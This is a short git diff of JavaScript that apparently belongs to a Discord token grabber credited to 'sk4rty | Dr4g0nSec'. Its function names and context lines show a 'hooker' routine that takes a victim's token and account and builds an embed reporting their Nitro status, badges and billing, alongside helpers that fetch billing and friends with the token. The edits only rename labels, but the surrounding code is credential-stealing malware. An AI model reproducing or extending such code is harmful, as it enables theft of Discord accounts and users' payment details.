@@ -159,7 +159,7 @@ const hooker = async (content, token, account) => {
         "text": "Created by sk4rty | Dr4g0nSec on Top!",
         "icon_url": "https://avatars.githubusercontent.com/u/150484081?v=4",
     };
-    content["embeds"][0]["title"] = "Informações da conta";
+    content["embeds"][0]["title"] = "Infos da conta";
 
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
@@ -181,7 +181,7 @@ const hooker = async (content, token, account) => {
         "value": badges,
         "inline": true
     }, {
-        "name": "Cobrança",
+        "name": "Billing",
         "value": billing,
         "inline": true
     });
@@ -229,7 +229,7 @@ const getNitro = flags => {
         case 3:
             return '`Nitro Basic`';
         default:
-            return '`❌`';
+            return '`Nenhum`';
     }
 };
 
@@ -239,7 +239,7 @@ const getBadges = flags => {
         let b = CONFIG.badges[badge];
         if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
     }
-    return badges || '`❌`';
+    return badges || '`Nenhum`';
 }
 
 const getRareBadges = flags => {
@@ -266,7 +266,7 @@ const getBilling = async token => {
             }
         }
     });
-    return billing || '`❌`';
+    return billing || '`Nenhum`';
 };
 
 const getFriends = async token => {
